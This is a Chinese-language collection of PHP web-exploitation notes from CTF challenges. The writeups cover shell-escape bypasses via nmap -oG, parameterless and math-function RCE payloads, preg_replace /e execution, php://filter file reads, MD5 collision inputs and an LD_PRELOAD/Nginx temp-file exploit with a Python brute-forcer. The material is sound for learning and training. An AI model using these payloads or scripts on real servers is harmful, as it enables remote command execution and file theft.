@@ -1,0 +1,754 @@
+# PHP Trick
+
+# PHP Trick
+
+## ****escapeshellarg，escapeshellcmd****
+
+### ****escapeshellarg****
+
+escapeshellarg作用是把字符串转码为可以在shell命令中使用的参数
+
+先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用
+
+- 参数注入
+- 逃逸字符
+
+escapeshellarg在处理字符串的时候，会重新申请内存空间，并对字符串逐个处理，但是不会对不可见字符进行处理导致不可见字符的消失
+
+### escapeshellcmd
+
+`escapeshellcmd`对`\`以及最后那个不配对的引号进行了转义
+
+### nmap
+
+`-oG` 参数可以将命令和结果写到对应的文件中
+
+### ****[网鼎杯 2020 朱雀组]Nmap****
+
+就大概是nmap的命令利用写shell，过滤了php，用了短标签和phtml来绕过，反弹shell拿了一手源码
+
+index.php里有****escapeshellarg，escapeshellcmd****的使用，这也是payload有单引号扩起来的原因
+
+之前尝试过直接写马拿shell但是蚁剑连不通，反弹shell后看了一下
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled.png)
+
+反弹shell写马POST都没了，尝试了GET也一样，感觉挺有意思的AWD可能有用就找一找原因
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%201.png)
+
+服务器翻了个遍啥也没发现
+
+**index.php**
+
+```php
+<?
+require('settings.php');
+
+set_time_limit(0);
+if (isset($_POST['host'])):
+        if (!defined('WEB_SCANS')) {
+                die('Web scans disabled');
+        }
+
+        $host = $_POST['host'];
+        if(stripos($host,'php')!==false){
+                die("Hacker...");
+        }
+        $host = escapeshellarg($host);
+        $host = escapeshellcmd($host);
+
+        $filename = substr(md5(time() . rand(1, 10)), 0, 5);
+        $command = "nmap ". NMAP_ARGS . " -oX " . RESULTS_PATH . $filename . " " . $host;
+        $result_scan = shell_exec($command);
+        if (is_null($result_scan)) {
+                die('Something went wrong');
+        } else {
+                header('Location: result.php?f=' . $filename);
+        }
+else:
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+        <meta charset="utf-8">
+        <title>NMAP‍</title>
+        <link rel="stylesheet" href="css/bootstrap.css">
+        <script src="js/jquery.js" type="text/javascript"></script>
+        <style type="text/css">
+                body {
+                        background: url("img/bg.png") no-repeat;
+                        background-size: 100%;
+                }
+        </style>
+</head>
+
+<body>
+        <div class="container" style="color:#48e5ff;">
+                <h1>NMAP‍</h1>
+                <? if (!defined('WEB_SCANS')): ?>
+                <p>Web scans disabled</p>
+                <? else: ?>
+                <p>Enter host or IP address to scan: </p>
+                <form id="scanform" class="form-inline" action="?" method="POST">
+                        <input type="text" name="host" class="input-large" placeholder="hostname / IP"> <button type="submit"
+                                class="btn">Scan</button>
+                </form>
+                <div id="waiter"></div>
+                <? endif; ?>
+                <hr>
+                <a href="<?=APP_URL . "list.php"?>"><button class="btn btn-inverse">View existing results</button></a>
+        </div>
+        <script>
+                $('#scanform').submit(function () {
+                        $('#waiter').append("<b>please, wait</b>");
+                });
+        </script>
+</body>
+<!-- flag is in /flag -->
+
+</html>
+<? endif; ?>
+```
+
+**settings.php**
+
+```php
+<?
+# Path where all files stored
+# Example values: /home/node/results/
+# Or just: xml/
+# Must be readble/writable for web server! so chmod 777 xml/
+define('RESULTS_PATH', 'xml/');
+
+# Nmap string arguments for web scanning
+# Example: -sV -Pn
+define('NMAP_ARGS', '-Pn -T4 -F --host-timeout 1000ms');
+
+# Comment this line to disable web scans
+define('WEB_SCANS', 'enable');
+
+# URL of application
+# for example: http://example.com/scanner/
+# Or just: /scanner/
+define('APP_URL', '/');
+
+# Secret word to protect webface (reserved)
+# Uncomment to set it!
+# define('secret_word', 'passw0rd1337');
+
+?>
+```
+
+**list.php**
+
+```php
+<?
+require('settings.php');
+$files = array();
+$list_files = scandir(RESULTS_PATH);
+foreach ($list_files as $filename) {
+        $files[filectime(RESULTS_PATH . $filename)] =array(
+                'filename' => $filename,
+                'ctime' => filectime(RESULTS_PATH . $filename)
+        ); 
+}
+krsort($files);
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <link rel="stylesheet" href="css/bootstrap.css">
+</head>
+<body>
+<div class="container">
+<a href="<?=APP_URL?>"><button class="btn btn-inverse">to index</button></a>
+<hr>
+<h1 >Scan results:</h1>
+<table class="table">
+<tr>
+        <td><b>File</b></td>
+        <td><b>Creation date</b></td>
+</tr>
+<?
+foreach ($files as $file):
+        if ($file['filename'] != "." && $file['filename'] != ".."):
+?>
+<tr>
+        <td><a href="<?=APP_URL . "result.php?f=" . $file['filename']?>"><?=$file['filename']?></a></td>
+        <td><?=date("r", $file['ctime'])?></td>
+</tr>
+<?
+        endif;
+endforeach;
+?>
+</table>
+</div>
+</body>
+</html>
+<?
+?>
+```
+
+**result.php**
+
+```php
+<?
+require('settings.php');
+# WEBMAP - do your nmap scans like a boss!
+#
+# Nmap XML to HTML.
+# Usage - /result.php?f=test
+# where test is name of file
+
+$folder = RESULTS_PATH;
+
+if (empty($_GET['f'])) {
+        die('No filename.');
+}
+
+#var_dump($_GET);
+if (!preg_match('/^([a-z0-9.\-]+)$/', $_GET['f'])) {
+        die('Wrong file name');
+}
+
+// xml file to parse
+$file =  $folder .  $_GET['f'];
+#echo $file;
+$result =  simplexml_load_file($file);
+
+if (!$result) {
+        die('Wrong file name');
+}
+
+if ($result->host->status['state'] != 'up') {
+        die('Host maybe down');
+}
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+        <meta charset="utf-8">
+        <title>scan results: <?=$result->host->address['addr']?></title>
+        <link rel="stylesheet" href="css/bootstrap.css">
+</head>
+
+<body>
+        <div class="container">
+                <a href="<?=APP_URL?>"><button class="btn btn-inverse">to index</button></a>
+                <a href="<?=APP_URL?>list.php"><button class="btn btn-inverse">to list</button></a>
+
+                <h1>Scan results for: <?=$result->host->address['addr']?></h1>
+                <hr>
+                <?/* General INFO about host */?>
+                <div class="well">
+                        <p><b>IP</b>: <?=$result->host->address['addr']?></p>
+
+                        <? if ($result->host->hostnames->hostname): ?>
+                        <? foreach ($result->host->hostnames->hostname as $hostname):?>
+                        <p><b>Hostname</b>: <?=$hostname['name']?> <em>(<?=$hostname['type']?>)</em></p>
+                        <? endforeach; ?>
+                        <? endif; ?>
+
+                        <? if ($result->host->os): ?>
+                        <p>
+                                <b>Operating System</b>:
+                                <? if($result->host->os->osmatch): ?>
+                                <? foreach($result->host->os->osmatch as $os): ?>
+                                <?=$os['name']?> (<?=$os['accuracy']?>%).
+                                <? endforeach; ?>
+                                <? endif;?>
+                        </p>
+                        <? endif; ?>
+                        <? if ($result->host->distance): ?>
+                        <p><b>Distance</b>: <?=$result->host->distance['value']?> hops</p>
+                        <? endif; ?>
+                        <? if ($result->host->uptime): ?>
+                        <p><b>Last boot</b>: <?=$result->host->uptime['lastboot']?></p>
+                        <? endif; ?>
+
+                </div>
+
+                <?/* If open ports: */?>
+                <? if ($result->host->ports->port): ?>
+                <h1>Ports:</h1>
+                <hr>
+                <? foreach ($result->host->ports->port as $port): ?>
+
+                <div>
+                        <? if ($port->state['state'] == "open"):?>
+                        <span class="badge badge-success"><?=$port->state['state']?></span>
+                        <? else: ?>
+                        <span class="badge"><?=$port->state['state']?></span>
+                        <? endif; ?>
+
+                        <b><?=$port['portid']?></b> (<?=$port['protocol']?>)
+                        Service name: <b><?=$port->service['name']?></b>.
+                        <? if ($port->service['product']): ?>
+                        Product: <b><?=$port->service['product']?></b>.
+                        <? endif; ?>
+                        <? if ($port->service['version']): ?>
+                        Version: <b><?=$port->service['version']?></b>.
+                        <? endif; ?>
+
+                        <? if ($port->script): ?>
+                        <? foreach ($port->script as $script): ?>
+                        <div class="well">
+                                <small>
+                                        <b><?=$script['id']?></b>:
+                                        <pre><?=$script['output']?></pre>
+                                </small>
+                        </div>
+                        <? endforeach; ?>
+                        <? endif;?>
+                </div>
+
+                <? endforeach; ?>
+                <? endif; ?>
+
+                <?/* If extra ports: */?>
+                <? if ($result->host->ports->extraports): ?>
+                <? foreach ($result->host->ports->extraports as $extraport): ?>
+                <? if ($extraport['state'] == 'closed'): ?>
+                <p class="text-error">Closed ports: <?=$extraport['count']?></p>
+                <? endif; ?>
+                <? endforeach; ?>
+                <? endif;?>
+                <hr>
+                <?/* Other info */?>
+                <p><?=$result->runstats->finished['summary']?></p>
+        </div>
+</body>
+
+</html>
+```
+
+### ****[BUUCTF 2018]Online Tool****
+
+```php
+<?php
+
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
+}
+```
+
+$host = ' <?php @evl(&_POST["YSY"]);?> -oG hack.php ’
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%202.png)
+
+蚁剑连接不到对应文件夹下的shell。。。
+
+## 无参数RCE
+
+- localeconv() 函数返回一包含本地数字及货币格式信息的数组。
+- current() 函数返回数组中的当前元素的值。
+- scandir列出指定目录中的文件和目录，当参数为.时，即列出当前目录的文件
+- array_reverse()函数以相反的元素顺序返回数组。
+- highlight_file将代码高亮显示出来
+
+### ****[GXYCTF2019]禁止套娃****
+
+获取目录下文件
+
+?exp=print_r(scandir(current(localeconv())));
+
+让指针指向flag.php元素
+
+?exp=print_r(next(array_reverse(scandir(current(localeconv())))));
+
+读取flag.php
+
+?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
+
+### 数学函数RCE
+
+- `base_convert(number,frombase,tobase)`在任意进制之间转换数字
+- `dechex(dec_number)`把十进制转换为十六进制。返回一个字符串，包含有给定 *binary_string* 参数的十六进制表示。所能转换的最大数值为十进制的 4294967295，其结果为 “ffffffff”
+- `hexdec(hex_string)`把十六进制转换为十进制。返回与 *hex_string* 参数所表示的十六进制数等值的的十进制数。
+- 其他的 `decbin` `decbin` `decoct` `octdec` 同上，分别是二进制、八进制与十进制的互转
+
+### **getallheaders 利用请求头传语句**
+
+### ****[CISCN 2019 初赛]Love Math****
+
+```php
+<?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+}
+```
+
+**systm(cat *)的构造**
+
+- cat
+    
+    **echo**
+    
+    base_convert("cat",36,10);
+    //15941
+    
+- system
+    
+    //base_convert(1751504350,10,36) ->system
+    
+- 空格*的构造
+    
+    ```php
+    <?php
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    $whitelist2 = [ 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh','abs'];
+    
+    foreach ($whitelist as $i):
+        foreach ($whitelist2 as $k):
+        echo $k^$i^" *";
+        echo "   " . $i . " " . $k;
+        echo "<br/>";
+        endforeach;
+    endforeach;
+    ```
+    
+
+**payload:**
+
+base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
+//base_convert(1751504350,10,36) ->system
+//base_convert(15941,10,36) -> cat
+//system('cat *')
+
+结果
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%203.png)
+
+**getallheaders绕过**
+
+将命令放在请求头中
+
+$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
+//base_convert(696468,10,36) -> exec
+//base_convert(8768397090111664438,10,30) -> getallheaders
+//exec(getallheaders(){1})
+
+直接反弹shell，如果再burp或者hackbar里面命令执行的话回显只有一个结果
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%204.png)
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%205.png)
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%206.png)
+
+### ****preg_replace()的/e模式存在命令执行漏洞****
+
+[](https://xz.aliyun.com/t/2557)
+
+### ****[BJDCTF2020]ZJCTF，不过如此****
+
+伪协议绕绕读next.php
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%207.png)
+
+```php
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+```
+
+将传参设置为\S*以此来匹配后面传入的函数
+
+- pyload:?\S*=${getFlag()}&cmd=system('ls /');
+
+可以任意命令执行了
+
+## PHP伪协议
+
+### zlib.deflate和zlib.inflate的配合
+
+### string.strip_tags的segment fault爆破临时文件
+
+### ****[WMCTF2020]Web Check in 2.0****
+
+[WMctf2020 Checkin出题想法&题解](https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/)
+
+### php伪协议的嵌套绕过对路径内容要求
+
+### ****[BSidesCF 2020]Had a bad day****
+
+在传参的地方伪协议读index.php源码
+
+?category=php://filter/convert.base64-encode/resource=index
+
+```php
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Images that spark joy">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <title>Had a bad day?</title>
+    <link rel="stylesheet" href="css/material.min.css">
+    <link rel="stylesheet" href="css/style.css">
+  </head>
+  <body>
+    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
+      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
+        <div class="mdl-layout__header-row">
+          <span class="mdl-layout-title">Had a bad day?</span>
+          <div class="mdl-layout-spacer"></div>
+        <div>
+      </header>
+      <div class="page-ribbon"></div>
+      <main class="page-main mdl-layout__content">
+        <div class="page-container mdl-grid">
+          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
+          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
+            <div class="page-crumbs mdl-color-text--grey-500">
+            </div>
+            <h3>Cheer up!</h3>
+              <p>
+                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
+              </p>
+              <div class="page-include">
+              <?php
+				$file = $_GET['category'];
+
+				if(isset($file))
+				{
+					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+						include ($file . '.php');
+					}
+					else{
+						echo "Sorry, we currently only support woofers and meowers.";
+					}
+				}
+				?>
+			</div>
+          <form action="index.php" method="get" id="choice">
+              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
+              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
+          </form>
+
+          </div>
+        </div>
+      </main>
+    </div>
+    <script src="js/material.min.js"></script>
+  </body>
+</html>
+```
+
+直接伪协议读，要求有index在之前读index.php的payload里加，加在前后都可
+
+php://filter/read=index/convert.base64-encode/resource=flag
+
+### md5碰撞
+
+- a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+- b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+
+ps：在hackbar中会url编码，直接用burp
+
+### ****[安洵杯 2019]easy_web****
+
+抓包看到了img参数感觉像是base64
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%208.png)
+
+解开之后发现还有更像了，再解就变成了hex
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%209.png)
+
+访问index.php拿源码
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%2010.png)
+
+```php
+<?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header('content-type:text/html;charset=utf-8');
+$cmd = $_GET['cmd'];
+if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
+    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
+$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
+
+$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
+if (preg_match("/flag/i", $file)) {
+    echo '<img src ="./ctf3.jpeg">';
+    die("xixi～ no flag");
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
+    echo "<br>";
+}
+echo $cmd;
+echo "<br>";
+if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
+    echo("forbid ~");
+    echo "<br>";
+} else {
+    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
+        echo `$cmd`;
+    } else {
+        echo ("md5 is funny ~");
+    }
+}
+
+?>
+<html>
+<style>
+  body{
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+}
+</style>
+<body>
+</body>
+</html>
+```
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%2011.png)
+
+绕过
+
+dir看目录
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%2012.png)
+
+\绕过
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%2013.png)
+
+### intval绕过
+
+这个函数是强制转换为int类型。经测试以下只适合php7.0及以下版本，7.2.23版本测试不可以（就算是字符串也直接解析科学记数法）
+
+但进行加 1 时会先将$a的科学计数法解析然后再加 1 。也就是说我们传入 12e3 第一次intval会为12 ，+1后会取得12001那么我们成功绕过了
+
+### MD5
+
+- 0e绕过
+
+### cat绕过
+
+**more、less、head、tail、sort、tac、nl**
+
+### ****[WUSTCTF2020]朴实无华****
+
+![Untitled](PHP%20Trick%2085f5b3dc12ee4d0f8917c3ff2a2f5a7e/Untitled%2014.png)
+
+payload：fl4g.php?num=2e10&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
+
+## 匿名函数
+
+### ****[HITCON 2017]Baby^h Master PHP****
+
+[hitconDockerfile/hitcon-ctf-2017/baby^h-master-php-2017 at master · t3hp0rP/hitconDockerfile](https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017)
+
+## Niginx
+
+Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件。如果打开一个进程打开了某个文件，某个文件就会出现在 /proc/PID/fd/ 目录下，我们可以通过重复发包so造成文件缓存，然后用LD_PRELOAD去加载我们这个动态链接库
+
+### ****[HFCTF2022]ezphp****
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+__attribute__ ((__constructor__)) void preload (void){
+	  unsetenv("LD_PRELOAD");
+	    system("id");
+	      system("cat /flag > /var/www/html/flag");
+```
+
+gcc -shared -fPIC exp.c -o [exp.so](http://exp.so/)
+
+```python
+import  threading, requests
+URL2 = f'http://fdd5bb90-2354-4db9-8430-7849719a67f4.node4.buuoj.cn:81/index.php'
+nginx_workers = [12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27]
+done = False
+
+def uploader():
+    print('[+] starting uploader')
+    with open("exp.so","rb") as f:
+        data1 = f.read()+b'0'*1024*1000
+        #print(data1)
+    while not done:
+        requests.get(URL2, data=data1)
+for _ in range(16):
+    t = threading.Thread(target=uploader)
+    t.start()
+def bruter(pid):
+    global done
+    while not done:
+        print(f'[+] brute loop restarted: {pid}')
+        for fd in range(4, 32):
+            try:
+                requests.get(URL2, params={
+                    'env': f"LD_PRELOAD=/proc/{pid}/fd/{fd}"
+                })
+            except:
+                pass
+
+for pid in nginx_workers:
+    a = threading.Thread(target=bruter, args=(pid, ))
+    a.start()
+```
